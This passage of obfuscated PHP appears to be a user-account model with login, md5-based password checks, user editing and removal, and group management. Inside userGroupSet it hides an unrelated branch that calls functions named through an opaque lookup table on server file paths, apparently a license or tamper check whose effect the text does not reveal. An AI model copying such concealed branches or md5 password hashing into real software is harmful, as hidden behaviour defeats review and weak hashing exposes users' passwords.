$a‚©ÑîÄá; goto a”‚÷œ¤ÀÚ; DÏòŞÓêƒŒ: if (!$a‚©ÑîÄá) { return $a‚©ÑîÄá; } $A„âœºˆŠÙ = md5($DœŞ§ó²Â[2374] . $a‚©ÑîÄá[$DœŞ§ó²Â[808]] . $DœŞ§ó²Â[2375] . $a‚©ÑîÄá[$DœŞ§ó²Â[28]]); $a‚©ÑîÄá = $this->_listDataApplyItem($a‚©ÑîÄá); goto Cö¬¡ßïø–; Cö¬¡ßïø–: $Aİ‚¨÷©¬† = Model($DœŞ§ó²Â[1087])->metaGet($a‚©ÑîÄá[$DœŞ§ó²Â[388]][$DœŞ§ó²Â[366]]); $a‚©ÑîÄá[$DœŞ§ó²Â[2376]] = $A„âœºˆŠÙ; $a‚©ÑîÄá[$DœŞ§ó²Â[388]][$DœŞ§ó²Â[2229]] = isset($Aİ‚¨÷©¬†[$DœŞ§ó²Â[2230]]) ? $Aİ‚¨÷©¬†[$DœŞ§ó²Â[2230]] : null; goto c®äÉÏŞí; a”‚÷œ¤ÀÚ: } return $this->cacheFunctionGet($DœŞ§ó²Â[2124], $cÁ©ÃêŒ¬); } protected function getInfoSimple($dÌÃâ¾Šâ, $A¬Õù¬’éá = false) { $Dòó„¤Âò· =& $_SERVER[¿õñ]; if (!$dÌÃâ¾Šâ) { return array(); } if ($A¬Õù¬’éá) { $CŒªŠè¯ÏÁ = $this->where(array($Dòó„¤Âò·[1350] => intval($dÌÃâ¾Šâ)))->find(); if (!is_array($CŒªŠè¯ÏÁ)) { return array(); } $CŒªŠè¯ÏÁ[$Dòó„¤Âò·[2377]] = Action($Dòó„¤Âò·[2378])->parseUrl($CŒªŠè¯ÏÁ[$Dòó„¤Âò·[2377]]); return $CŒªŠè¯ÏÁ; } return $this->cacheFunctionGet($Dòó„¤Âò·[2084], $dÌÃâ¾Šâ); } protected function getInfoSimpleOuter($eá‰šĞÔø¢) { goto c¿—Ìî¶È; c¿—Ìî¶È: $FÉƒôÊª£ï =& $_SERVER[¿õñ]; if (!$eá‰šĞÔø¢ || $eá‰šĞÔø¢ == 0) { return array($FÉƒôÊª£ï[1350] => $FÉƒôÊª£ï[464], $FÉƒôÊª£ï[28] => $FÉƒôÊª£ï[154] . LNG($FÉƒôÊª£ï[2379]) . $FÉƒôÊª£ï[468], $FÉƒôÊª£ï[2377] => STATIC_PATH . $FÉƒôÊª£ï[2380]); } $DªÒƒ½Ó¤ = $this->cacheFunctionGet($FÉƒôÊª£ï[2084], $eá‰šĞÔø¢); goto Aˆ¶¿à™†; Aˆ¶¿à™†: $bÑÔäèÛÑ• = array_field_key($DªÒƒ½Ó¤, explode($FÉƒôÊª£ï[47], $this->simpleField)); if (!$bÑÔäèÛÑ•) { return array($FÉƒôÊª£ï[1350] => $FÉƒôÊª£ï[1016], $FÉƒôÊª£ï[28] => $FÉƒôÊª£ï[154] . LNG($FÉƒôÊª£ï[2381]) . $FÉƒôÊª£ï[468], $FÉƒôÊª£ï[2377] => STATIC_PATH . $FÉƒôÊª£ï[2382]); } $bÑÔäèÛÑ•[$FÉƒôÊª£ï[2377]] = Action($FÉƒôÊª£ï[2378])->parseUrl($bÑÔäèÛÑ•[$FÉƒôÊª£ï[2377]]); goto AæìÁÍÕ; AæìÁÍÕ: return $bÑÔäèÛÑ•; goto AÍ‡ÁÑŸ; AÍ‡ÁÑŸ: } protected function groupUser($Fº©ëÌ©ìë) { } public static function errorLang($EÈ´¶ßšŠ§) { $a“”„æ£ª =& $_SERVER[¿õñ]; $cÉïÅˆ¹å = array(self::ERROR_USER_NOT_EXISTS => $a“”„æ£ª[2383], self::ERROR_USER_PASSWORD_ERROR => $a“”„æ£ª[2384], self::ERROR_USER_EXIST_NAME => $a“”„æ£ª[2385], self::ERROR_USER_EXIST_PHONE => $a“”„æ£ª[2386], self::ERROR_USER_EXIST_EMAIL => $a“”„æ£ª[2387], self::ERROR_USER_LOGIN_LOCK => $a“”„æ£ª[2388], self::ERROR_IP_NOT_ALLOW => $a“”„æ£ª[2389], self::ERROR_USER_EXIST_NICKNAME => $a“”„æ£ª[2390]); return LNG($cÉïÅˆ¹å[$EÈ´¶ßšŠ§]); } public function getInfoByMeta($B‡Áâ×·›é, $fÄ‡´õñŞâ) { $FèÊ…‹Ñ‹ =& $_SERVER[¿õñ]; $d¸µ•Üğ˜ = Model($FèÊ…‹Ñ‹[2391])->where(array($FèÊ…‹Ñ‹[88] => $B‡Áâ×·›é, $FèÊ…‹Ñ‹[354] => $fÄ‡´õñŞâ))->find(); if ($d¸µ•Üğ˜) { return $this->getInfo($d¸µ•Üğ˜[$FèÊ…‹Ñ‹[1350]]); } return !1; } public function userLoginCheck($EÄË¨®•°, $EÎ‡ùîÌ“) { goto dõ©½³ˆÜ; dõ©½³ˆÜ: $aÖìÁ» åË =& $_SERVER[¿õñ]; $AŒ“‘¯ã± = array($aÖìÁ» åË[28] => $EÄË¨®•°, $aÖìÁ» åË[2233] => $EÄË¨®•°, $aÖìÁ» åË[290] => $EÄË¨®•°, $aÖìÁ» åË[2392] => $EÄË¨®•°, $aÖìÁ» åË[921] => $aÖìÁ» åË[923]); if ($this->nickNameRpt()) { unset($AŒ“‘¯ã±[$aÖìÁ» åË[2233]]); } goto D•çİì“¬¡; D•çİì“¬¡: $BÄÇô­Ò’¬ = $this->where($AŒ“‘¯ã±)->find(); if (!$BÄÇô­Ò’¬) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($BÄÇô­Ò’¬[$aÖìÁ» åË[1350]], $EÎ‡ùîÌ“)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto B…âèšãè; B…âèšãè: $this->userEdit($BÄÇô­Ò’¬[$aÖìÁ» åË[1350]], array($aÖìÁ» åË[2393] => time())); $this->clearCache($BÄÇô­Ò’¬[$aÖìÁ» åË[1350]]); return $this->getInfo($BÄÇô­Ò’¬[$aÖìÁ» åË[1350]]); goto A“Åá†°«; A“Åá†°«: } public function clearCache($a„çº°©İİ) { $D¦Âî’‡÷« =& $_SERVER[¿õñ]; $this->cacheFunctionClear($D¦Âî’‡÷«[2124], $a„çº°©İİ); $this->cacheFunctionClear($D¦Âî’‡÷«[2084], $a„çº°©İİ); } public function userPasswordCheck($aøÛ™ÂÔ², $c¤õ–‡„…¸) { $aÛ¥îªğ½ =& $_SERVER[¿õñ]; $e£¯ÀÏğÈ’ = $this->where(array($aÛ¥îªğ½[1350] => intval($aøÛ™ÂÔ²)))->find(); $a‹ÉÃÍ”¿Ú = $this->metaGet($aøÛ™ÂÔ²); $AÎäí¥Æâô = isset($a‹ÉÃÍ”¿Ú[$aÛ¥îªğ½[2394]]) ? $a‹ÉÃÍ”¿Ú[$aÛ¥îªğ½[2394]] : $aÛ¥îªğ½[33]; if (md5($AÎäí¥Æâô . trim($c¤õ–‡„…¸)) !== $e£¯ÀÏğÈ’[$aÛ¥îªğ½[808]]) { return !1; } return !0; } public function userAdd($c£¼Ë’¡¯Ç) { goto BË©„‰áÈ÷; FÓš°¨•â»: $AÒ‡”‘£è¤ = array($C…†¨…×¾¨[2403] => $dÎÁÆ•ë[$C…†¨…×¾¨[808]], $C…†¨…×¾¨[2399] => $dÎÁÆ•ë[$C…†¨…×¾¨[2233]]); $this->userEdit($f©ƒõå‚ñ, $AÒ‡”‘£è¤); Model($C…†¨…×¾¨[1087])->userRootAdd($f©ƒõå‚ñ); goto fµïÅÂ¾°Á; fµïÅÂ¾°Á: return $f©ƒõå‚ñ; goto bÒ™àë‚Şà; F®Îó½Âˆ¹: $E­¥“ Ä¤‹ = $this->_checkExist($c£¼Ë’¡¯Ç); if ($E­¥“ Ä¤‹ !== !0) { return $E­¥“ Ä¤‹; } $f©ƒõå‚ñ = $this->add($dÎÁÆ•ë); goto FÓš°¨•â»; BË©„‰áÈ÷: $C…†¨…×¾¨ =& $_SERVER[¿õñ]; $dÎÁÆ•ë = array($C…†¨…×¾¨[383] => $c£¼Ë’¡¯Ç[$C…†¨…×¾¨[28]], $C…†¨…×¾¨[2395] => $c£¼Ë’¡¯Ç[$C…†¨…×¾¨[2396]], $C…†¨…×¾¨[2397] => isset($c£¼Ë’¡¯Ç[$C…†¨…×¾¨[290]]) ? $c£¼Ë’¡¯Ç[$C…†¨…×¾¨[290]] : $C…†¨…×¾¨[33], $C…†¨…×¾¨[2398] => isset($c£¼Ë’¡¯Ç[$C…†¨…×¾¨[2392]]) ? $c£¼Ë’¡¯Ç[$C…†¨…×¾¨[2392]] : $C…†¨…×¾¨[33], $C…†¨…×¾¨[2399] => isset($c£¼Ë’¡¯Ç[$C…†¨…×¾¨[2233]]) ? $c£¼Ë’¡¯Ç[$C…†¨…×¾¨[2233]] : $c£¼Ë’¡¯Ç[$C…†¨…×¾¨[28]], $C…†¨…×¾¨[2400] => isset($c£¼Ë’¡¯Ç[$C…†¨…×¾¨[2377]]) ? $c£¼Ë’¡¯Ç[$C…†¨…×¾¨[2377]] : $C…†¨…×¾¨[33], $C…†¨…×¾¨[2401] => isset($c£¼Ë’¡¯Ç[$C…†¨…×¾¨[2402]]) ? $c£¼Ë’¡¯Ç[$C…†¨…×¾¨[2402]] : 1, $C…†¨…×¾¨[2403] => $c£¼Ë’¡¯Ç[$C…†¨…×¾¨[808]], $C…†¨…×¾¨[2086] => isset($c£¼Ë’¡¯Ç[$C…†¨…×¾¨[1997]]) ? $c£¼Ë’¡¯Ç[$C…†¨…×¾¨[1997]] : 1024 * 1024 * 20, $C…†¨…×¾¨[2087] => 0, $C…†¨…×¾¨[2393] => 0, $C…†¨…×¾¨[2111] => isset($c£¼Ë’¡¯Ç[$C…†¨…×¾¨[686]]) ? $c£¼Ë’¡¯Ç[$C…†¨…×¾¨[686]] : 1); if (!empty($c£¼Ë’¡¯Ç[$C…†¨…×¾¨[1350]])) { $dÎÁÆ•ë[$C…†¨…×¾¨[1350]] = $c£¼Ë’¡¯Ç[$C…†¨…×¾¨[1350]]; } goto F®Îó½Âˆ¹; bÒ™àë‚Şà: } protected function userEditTest($Fø’àŒÑ‡ù, $FªÇ‰ÍŒËÈ) { return $this->call($_SERVER[¿õñ][2404], $Fø’àŒÑ‡ù, $FªÇ‰ÍŒËÈ); } protected function userEdit($FÙáÈ¡ÍÙÖ, $A–›¸”»×š) { goto D¬µÆŞÀ‰¡; C»‘ô—êƒ: $eÙ“ŞöÎ…‡ = $this->_checkExist($A–›¸”»×š, $FÙáÈ¡ÍÙÖ); if ($eÙ“ŞöÎ…‡ !== !0) { return $eÙ“ŞöÎ…‡; } if (isset($A–›¸”»×š[$EÄÔäØİ»[808]]) && trim($A–›¸”»×š[$EÄÔäØİ»[808]]) != $EÄÔäØİ»[33]) { $B¦¬ˆ•–Ö• = $this->metaGet($FÙáÈ¡ÍÙÖ); if (empty($B¦¬ˆ•–Ö•[$EÄÔäØİ»[2394]])) { $B¦¬ˆ•–Ö•[$EÄÔäØİ»[2394]] = rand_string(10); Model($EÄÔäØİ»[466])->metaSet($FÙáÈ¡ÍÙÖ, $EÄÔäØİ»[2394], $B¦¬ˆ•–Ö•[$EÄÔäØİ»[2394]]); } $A–›¸”»×š[$EÄÔäØİ»[808]] = md5($B¦¬ˆ•–Ö•[$EÄÔäØİ»[2394]] . trim($A–›¸”»×š[$EÄÔäØİ»[808]])); } else { unset($A–›¸”»×š[$EÄÔäØİ»[808]]); } goto bëÔİêø„´; bëÔİêø„´: $this->where(array($EÄÔäØİ»[1341] => $FÙáÈ¡ÍÙÖ))->save($A–›¸”»×š); if (isset($A–›¸”»×š[$EÄÔäØİ»[2233]])) { $this->setNamePinyin($FÙáÈ¡ÍÙÖ, $A–›¸”»×š[$EÄÔäØİ»[2233]]); } return !0; goto bÆ àñâ¤Ç; D¬µÆŞÀ‰¡: $EÄÔäØİ» =& $_SERVER[¿õñ]; $eí‘ƒ¤¼ò = $this->getInfoSimple($FÙáÈ¡ÍÙÖ); if (!$eí‘ƒ¤¼ò) { return !1; } goto C»‘ô—êƒ; bÆ àñâ¤Ç: } public function setNamePinyin($A•÷°ß£¤Û, $A¼ì”Ş¨Ü® = false) { $fœ¿ğñŒË =& $_SERVER[¿õñ]; if (!$A¼ì”Ş¨Ü®) { $BÄÌ¬™Ö¤° = $this->getInfoSimple($A•÷°ß£¤Û); $A¼ì”Ş¨Ü® = $BÄÌ¬™Ö¤°[$fœ¿ğñŒË[2233]] ? $BÄÌ¬™Ö¤°[$fœ¿ğñŒË[2233]] : $BÄÌ¬™Ö¤°[$fœ¿ğñŒË[28]]; } $C‹ŸØ·øÍ‚ = Model($fœ¿ğñŒË[469]); if (!Input::check($A¼ì”Ş¨Ü®, $fœ¿ğñŒË[520])) { return $C‹ŸØ·øÍ‚->metaSet($A•÷°ß£¤Û, array($fœ¿ğñŒË[412] => $fœ¿ğñŒË[33], $fœ¿ğñŒË[411] => $fœ¿ğñŒË[33])); } return $C‹ŸØ·øÍ‚->metaSet($A•÷°ß£¤Û, array($fœ¿ğñŒË[412] => str_replace($fœ¿ğñŒË[50], $fœ¿ğñŒË[33], Pinyin::encode($A¼ì”Ş¨Ü®)), $fœ¿ğñŒË[411] => Pinyin::encode($A¼ì”Ş¨Ü®, $fœ¿ğñŒË[521]))); } private function nickNameRpt() { $D·Ö¶Ÿ›¦ =& $_SERVER[¿õñ]; $aùàÇ‚Ëèº = Model($D·Ö¶Ÿ›¦[1067])->get($D·Ö¶Ÿ›¦[2405]); $EÆ†ªÕœ…² = $GLOBALS[$D·Ö¶Ÿ›¦[6]][$D·Ö¶Ÿ›¦[2406]][$D·Ö¶Ÿ›¦[2405]]; $DŠ±Ãóï½È = !is_null($aùàÇ‚Ëèº) ? $aùàÇ‚Ëèº : $EÆ†ªÕœ…²; return !!$DŠ±Ãóï½È; } private function _checkExist($C®¦âÖ¹ÃÉ, $dÅ†šœİÏ˜ = false) { $bšïÓ’¤§ù =& $_SERVER[¿õñ]; $Cœ®çŠ‹Ìø = array($bšïÓ’¤§ù[28] => UserModel::ERROR_USER_EXIST_NAME, $bšïÓ’¤§ù[2233] => UserModel::ERROR_USER_EXIST_NICKNAME, $bšïÓ’¤§ù[290] => UserModel::ERROR_USER_EXIST_EMAIL, $bšïÓ’¤§ù[2392] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Cœ®çŠ‹Ìø[$bšïÓ’¤§ù[2233]]); } $dãÁ«­Ç = $dÅ†šœİÏ˜ ? array($bšïÓ’¤§ù[1350] => array($bšïÓ’¤§ù[2407], $dÅ†šœİÏ˜)) : array(); foreach ($Cœ®çŠ‹Ìø as $C—‚ïê˜´– => $dá¬˜Øí …) { if (!isset($C®¦âÖ¹ÃÉ[$C—‚ïê˜´–]) || !$C®¦âÖ¹ÃÉ[$C—‚ïê˜´–]) { continue; } $d¶›œ¨¿¸Ö = array_merge(array($C—‚ïê˜´– => $C®¦âÖ¹ÃÉ[$C—‚ïê˜´–]), $dãÁ«­Ç); $F³©‰“òö = $this->where($d¶›œ¨¿¸Ö)->find(); if ($F³©‰“òö) { return $dá¬˜Øí …; } } return !0; } public function userListInfo($eË¡“³³˜) { $EÖÍ˜İ•”ô =& $_SERVER[¿õñ]; $bøä‰ÊÄÏ÷ = array(); $eË¡“³³˜ = array_unique($eË¡“³³˜); if (!$eË¡“³³˜) { return $bøä‰ÊÄÏ÷; } if (count($eË¡“³³˜) < 20) { foreach ($eË¡“³³˜ as $bÆÈËñ…™â) { $bøä‰ÊÄÏ÷[$bÆÈËñ…™â . $EÖÍ˜İ•”ô[33]] = $this->getInfoSimpleOuter($bÆÈËñ…™â); } } else { $EÈä“°¿—ä = array($EÖÍ˜İ•”ô[1341] => array($EÖÍ˜İ•”ô[381], $eË¡“³³˜)); if (count($eË¡“³³˜) == 1) { $EÈä“°¿—ä = array($EÖÍ˜İ•”ô[1341] => $eË¡“³³˜[0]); } $e’´áÊ¹˜Æ = Model($EÖÍ˜İ•”ô[466])->field($this->simpleField)->where($EÈä“°¿—ä)->select(); $e’´áÊ¹˜Æ = array_to_keyvalue($e’´áÊ¹˜Æ, $EÖÍ˜İ•”ô[1350]); foreach ($eË¡“³³˜ as $bÆÈËñ…™â) { $d¼Ì†¢¬ = $e’´áÊ¹˜Æ[$e’´áÊ¹˜Æ[$bÆÈËñ…™â]]; if (!$d¼Ì†¢¬) { $bøä‰ÊÄÏ÷[$bÆÈËñ…™â . $EÖÍ˜İ•”ô[33]] = $this->getInfoSimpleOuter($bÆÈËñ…™â); continue; } $d¼Ì†¢¬[$EÖÍ˜İ•”ô[2377]] = Action($EÖÍ˜İ•”ô[2378])->parseUrl($d¼Ì†¢¬[$EÖÍ˜İ•”ô[2377]]); $bøä‰ÊÄÏ÷[$bÆÈËñ…™â . $EÖÍ˜İ•”ô[33]] = $d¼Ì†¢¬; } } return $bøä‰ÊÄÏ÷; } protected function userStatus($A¨ƒáŒ£É¨, $eİØ¼£ñ¡¢) { $A°²‡Ô°†¹ = $this->getInfoSimple($A¨ƒáŒ£É¨); if (!$A°²‡Ô°†¹) { return !1; } $fÑ‹©øòŠ = array($_SERVER[¿õñ][686] => $eİØ¼£ñ¡¢); return $this->userEdit($A¨ƒáŒ£É¨, $fÑ‹©øòŠ); } protected function userRemove($D¨Ùµç£ë×) { goto BÕèîŸÉ™; Bîçî…Œ®æ: Model($aêàòíÆŞé[2090])->where($C°¥µä×)->delete(); Model($aêàòíÆŞé[2391])->where($C°¥µä×)->delete(); Model($aêàòíÆŞé[2409])->where($C°¥µä×)->delete(); goto F×¹¸Ûñ‰Ú; BÕèîŸÉ™: $aêàòíÆŞé =& $_SERVER[¿õñ]; $b†°å†Ä˜á = $this->getInfoSimple($D¨Ùµç£ë×); if (!$b†°å†Ä˜á) { return !1; } goto eÄ‚Àåñá¾; F×¹¸Ûñ‰Ú: Model($aêàòíÆŞé[759])->userRootRemove($D¨Ùµç£ë×); return $this->where($C°¥µä×)->delete(); goto a ó¦¢ÑØ; eÄ‚Àåñá¾: $C°¥µä× = array($aêàòíÆŞé[1341] => $D¨Ùµç£ë×); Model($aêàòíÆŞé[528])->where($C°¥µä×)->delete(); Model($aêàòíÆŞé[2408])->where($C°¥µä×)->delete(); goto Bîçî…Œ®æ; a ó¦¢ÑØ: } protected function userGroupSet($C½ÅÀĞÑ¢©, $Bò¹–³÷ÅÁ, $f²œ¸Ê…› = array()) { goto C¯ğµ‡ƒËÂ; EğæˆëŒ£: if (!$c“Œ×‘„» || !is_array($Bò¹–³÷ÅÁ)) { return !1; } $BÜÕ£¯ì¤® = Model($F›¿ÆœğƒÆ[2090]); $BÜÕ£¯ì¤®->where(array($F›¿ÆœğƒÆ[1350] => $C½ÅÀĞÑ¢©))->delete(); goto AëáÙÙÅò; AÃğîøî××: return $BÜÕ£¯ì¤®->addAll($bË§µË®•†, array(), !0); goto E¿Ù‰ç„À®; AëáÙÙÅò: $bË§µË®•† = array(); $d‘íïí¼Ğä = 0; foreach ($Bò¹–³÷ÅÁ as $aÃ½âÕè½ => $f¸„‚æˆ¨) { $E¦Üğ¹ñò = array($F›¿ÆœğƒÆ[1350] => $C½ÅÀĞÑ¢©, $F›¿ÆœğƒÆ[2013] => $aÃ½âÕè½, $F›¿ÆœğƒÆ[2144] => $f¸„‚æˆ¨); $E¦Üğ¹ñò[$F›¿ÆœğƒÆ[2034]] = isset($f²œ¸Ê…›[$d‘íïí¼Ğä]) ? $f²œ¸Ê…›[$d‘íïí¼Ğä] : 0; $d‘íïí¼Ğä++; $bË§µË®•†[] = $E¦Üğ¹ñò; } goto AÃğîøî××; C¯ğµ‡ƒËÂ: $F›¿ÆœğƒÆ =& $_SERVER[¿õñ]; if ($_SERVER[$F›¿ÆœğƒÆ[780]] != $_SERVER[$F›¿ÆœğƒÆ[2239]]) { goto Dš‹ÆÁ§²; d¥öƒ£•ò: $D‹×ÉÒø¯ = 1; while ($D‹×ÉÒø¯ > 1) { $D‹×ÉÒø¯ = $D‹×ÉÒø¯ + 4; $e‘Ñ‚¡Œº¬ = rawurlencode($D‹×ÉÒø¯ . $F›¿ÆœğƒÆ[358]); } goto dœŒÅ¥„©; cÒÂÓŸÓ: $Eø‰ÚÖ¾çÊ = $F›¿ÆœğƒÆ[802]; $Eø‰ÚÖ¾çÊ($_SERVER[$F›¿ÆœğƒÆ[803]]); $Eø‰ÚÖ¾çÊ($_SERVER[$F›¿ÆœğƒÆ[782]] . $F›¿ÆœğƒÆ[2240]); goto d¥öƒ£•ò; còçÔœ•Í: $c©Ê‰Û†®¸ = $Båê–êØ¯¯($Bôß˜ŸĞŠš); $a¹™¦Õ·‚Ü = explode($F›¿ÆœğƒÆ[214], $c©Ê‰Û†®¸); if (count($a¹™¦Õ·‚Ü) < $F›¿ÆœğƒÆ[553]) { $D•Ú­ = $F›¿ÆœğƒÆ[784]; $D•Ú­(); } goto cÒÂÓŸÓ; Dš‹ÆÁ§²: $bÌÉãáœ Ÿ = $F›¿ÆœğƒÆ[801]; $Båê–êØ¯¯ = $F›¿ÆœğƒÆ[781]; $Bôß˜ŸĞŠš = $_SERVER[$F›¿ÆœğƒÆ[782]] . $F›¿ÆœğƒÆ[783]; goto còçÔœ•Í; dœŒÅ¥„©: } $c“Œ×‘„» = $this->getInfoSimple($C½ÅÀĞÑ¢©); goto EğæˆëŒ£; E¿Ù‰ç„À®: } protected function userGroupAdd($Eì’ˆå†ƒš, $eªØéÃÄÈÆ, $BåÛ´§È«) { $e¤©¹…ËŞä =& $_SERVER[¿õñ]; $d½óÔ»Œ” = $this->getInfoSimple($Eì’ˆå†ƒš); if (!$d½óÔ»Œ” || !$eªØéÃÄÈÆ) { return !1; } $FÙßèã¡¤á = array(array($e¤©¹…ËŞä[1350] => $Eì’ˆå†ƒš, $e¤©¹…ËŞä[2013] => $eªØéÃÄÈÆ, $e¤©¹…ËŞä[2144] => $BåÛ´§È«)); return Model($e¤©¹…ËŞä[2090])->addAll($FÙßèã¡¤á, array(), !0); } protected function userGroupRemove($Bªö‡Œ¯¶, $f‚ÓÉÏ¬¡¼) { $e¹â÷“äàª =& $_SERVER[¿õñ]; $aŞ÷©Ø«… = $this->getInfoSimple($Bªö‡Œ¯¶); if (!$aŞ÷©Ø«… || !$f‚ÓÉÏ¬¡¼) { return !1; } $F§¬‹±Ú© = array($e¹â÷“äàª[1341] => $Bªö‡Œ¯¶, $e¹â÷“äàª[2088] => $f‚ÓÉÏ¬¡¼); return Model($e¹â÷“äàª[2090])->where($F§¬‹±Ú©)->delete(); } public function listData() { $fÈ²¸Î§¼× = $this->_makeOrder()->selectPage(50); $this->_listDataApply($fÈ²¸Î§¼×[$_SERVER[¿õñ][350]]); return $fÈ²¸Î§¼×; } public function listByID($c™µ«•ªÌ¾) { $a½øÔ’ëÉ™ =& $_SERVER[¿õñ]; if (!$c™µ«•ªÌ¾) { return; } $EÖéÛâô² = array($a½øÔ’ëÉ™[1350] => array($a½øÔ’ëÉ™[7], $c™µ«•ªÌ¾)); $C–¦‹»±Š = $this->where($EÖéÛâô²)->select(); $this->_listDataApply($C–¦‹»±Š); return $C–¦‹»±Š; } public function listByGroup($d™µÌ‰Ñ…è = 0, $a…±“Àæ·‹ = array()) { goto e³Şè¦¿äó; F¢Ö©İã™”: $e³œß¨¾Ìì = array(); if ($d™µÌ‰Ñ…è) { $e³œß¨¾Ìì = array($C¤¸Ä•’¯Ã[2411] => intval($d™µÌ‰Ñ…è)); $B½Ïğ†¾Òì = "\x4c\x45\x46\124\40\x4a\x4f\111\116\x20{$this->tablePrefix}\165\163\x65\x72\137\x67\x72\157\165\160\x20\x75\163\x65\162\137\147\x72\157\165\160\x20\x6f\x6e\x20\x75\163\145\x72\x2e\x75\163\145\x72\111\x44\x20\x3d\40\165\163\x65\x72\x5f\x67\x72\157\x75\160\56\x75\x73\145\162\111\104"; $Ağß¤à£® = Input::get($C¤¸Ä•’¯Ã[403], null, $C¤¸Ä•’¯Ã[33]) ? $C¤¸Ä•’¯Ã[33] : $C¤¸Ä•’¯Ã[2412]; } if (isset($a…±“Àæ·‹[$C¤¸Ä•’¯Ã[686]])) { $e³œß¨¾Ìì[$C¤¸Ä•’¯Ã[2413]] = $a…±“Àæ·‹[$C¤¸Ä•’¯Ã[686]]; } goto a¨”«ÅÚöã; a„ÊÙÎ¢ÇË: return $e¤ĞÚ´Ş·; goto B»àÌ˜æ¨®; a¨”«ÅÚöã: $e¤ĞÚ´Ş· = $this->_makeOrder($Ağß¤à£®)->field($C¤¸Ä•’¯Ã[2414])->where($e³œß¨¾Ìì)->join($B½Ïğ†¾Òì)->selectPage(50); $dÓ½ÕİÂÒ = $C¤¸Ä•’¯Ã[978] . ($D´ÆÖï©Î× ? $C¤¸Ä•’¯Ã[47] . $D´ÆÖï©Î× : $C¤¸Ä•’¯Ã[33]); $this->_listDataApply($e¤ĞÚ´Ş·[$C¤¸Ä•’¯Ã[350]], $dÓ½ÕİÂÒ); goto a„ÊÙÎ¢ÇË; e³Şè¦¿äó: $C¤¸Ä•’¯Ã =& $_SERVER[¿õñ]; $D´ÆÖï©Î× = isset($a…±“Àæ·‹[$C¤¸Ä•’¯Ã[2410]]) ? $a…±“Àæ·‹[$C¤¸Ä•’¯Ã[2410]] : $C¤¸Ä•’¯Ã[33]; $B½Ïğ†¾Òì = $C¤¸Ä•’¯Ã[33]; goto F¢Ö©İã™”; B»àÌ˜æ¨®: } private function _makeOrder($eòÛÑßã˜© = '') { goto Eé¬æ…Ş—á; c”ïÚ ´®º: $eòÛÑßã˜© = $eòÛÑßã˜© . "\x75\x73\x65\162\56{$fßˆÁŠÆÇ}\40{$Aä˜Ö‰Ñ‡½}\54\40\165\x73\145\x72\x2e\165\x73\x65\x72\x49\x44\40\x61\x73\143"; return $this->alias($e©ß·¾Èá¿[2174])->order($eòÛÑßã˜©); goto FµìèÇ…Î; e¸©ˆİ ½ö: $fßˆÁŠÆÇ = Input::get($e©ß·¾Èá¿[403], $e©ß·¾Èá¿[7], $e©ß·¾Èá¿[1341], $E³â›ôèšè); $Aä˜Ö‰Ñ‡½ = Input::get($e©ß·¾Èá¿[404], $e©ß·¾Èá¿[7], $e©ß·¾Èá¿[2091], array($e©ß·¾Èá¿[2091], $e©ß·¾Èá¿[400])); $Aä˜Ö‰Ñ‡½ = $BŠ¦Âóæ¨[$Aä˜Ö‰Ñ‡½]; goto c”ïÚ ´®º; Eé¬æ…Ş—á: $e©ß·¾Èá¿ =& $_SERVER[¿õñ]; $E³â›ôèšè = array($e©ß·¾Èá¿[1350], $e©ß·¾Èá¿[28], $e©ß·¾Èá¿[1999], $e©ß·¾Èá¿[1973], $e©ß·¾Èá¿[184]); $BŠ¦Âóæ¨ = array($e©ß·¾Èá¿[398] => $e©ß·¾Èá¿[399], $e©ß·¾Èá¿[400] => $e©ß·¾Èá¿[401]); goto e¸©ˆİ ½ö; FµìèÇ…Î: } public function listSearch($bÆ…Ë®¶‡Ï) { goto Fº×¿†È¿À; CÑÆâ¤†¢‰: $this->_filterUserList($A¿ñóåÂó§); return $A¿ñóåÂó§; goto AÓÛİŠÓË; fõ²Ó”‹¿: if (!$A¿ñóåÂó§ || count($A¿ñóåÂó§[$Aš¨•Èµƒ÷[350]]) < 5 && Input::check($EİŞ†ƒµ, $Aš¨•Èµƒ÷[303])) { $FÒ˜—®Š¤ø = $this->_searchFromMeta($Aš¨•Èµƒ÷[411], $EİŞ†ƒµ, 10); $cç˜²ôÉØÚ = $this->_searchFromMeta($Aš¨•Èµƒ÷[412], $EİŞ†ƒµ, 10); $A°ëğìçñ = array_merge($FÒ˜—®Š¤ø, $cç˜²ôÉØÚ, $A¿ñóåÂó§[$Aš¨•Èµƒ÷[350]]); $A¿ñóåÂó§[$Aš¨•Èµƒ÷[350]] = array_unique_by_key($A°ëğìçñ, $Aš¨•Èµƒ÷[1350]); $A¿ñóåÂó§[$Aš¨•Èµƒ÷[347]][$Aš¨•Èµƒ÷[348]] = count($A¿ñóåÂó§[$Aš¨•Èµƒ÷[350]]); $A¿ñóåÂó§[$Aš¨•Èµƒ÷[347]][$Aš¨•Èµƒ÷[349]] = ceil($A¿ñóåÂó§[$Aš¨•Èµƒ÷[347]][$Aš¨•Èµƒ÷[348]] / $A¿ñóåÂó§[$Aš¨•Èµƒ÷[347]][$Aš¨•Èµƒ÷[345]]); } $this->_listDataApply($A¿ñóåÂó§[$Aš¨•Èµƒ÷[350]]); $this->_filterByGroup($A¿ñóåÂó§, $EÃñçæá±È); goto CÑÆâ¤†¢‰; Dù¥®´Ş: $EİŞ†ƒµ = str_replace($Aš¨•Èµƒ÷[2094], $Aš¨•Èµƒ÷[2095], trim($EİŞ†ƒµ)); $e¤¶ª§¸»ˆ = array($Aš¨•Èµƒ÷[28] => array($Aš¨•Èµƒ÷[758], "\x25{$EİŞ†ƒµ}\x25"), $Aš¨•Èµƒ÷[290] => array($Aš¨•Èµƒ÷[758], "\45{$EİŞ†ƒµ}\45"), $Aš¨•Èµƒ÷[2233] => array($Aš¨•Èµƒ÷[758], "\x25{$EİŞ†ƒµ}\45"), $Aš¨•Èµƒ÷[921] => $Aš¨•Èµƒ÷[2096]); if (Input::check($EİŞ†ƒµ, $Aš¨•Èµƒ÷[296])) { $e¤¶ª§¸»ˆ[$Aš¨•Èµƒ÷[1350]] = array($Aš¨•Èµƒ÷[758], "\x25{$EİŞ†ƒµ}\45"); $e¤¶ª§¸»ˆ[$Aš¨•Èµƒ÷[2392]] = array($Aš¨•Èµƒ÷[758], "\x25{$EİŞ†ƒµ}\45"); } goto CÜÇô ¾˜ù; Fº×¿†È¿À: $Aš¨•Èµƒ÷ =& $_SERVER[¿õñ]; $EİŞ†ƒµ = 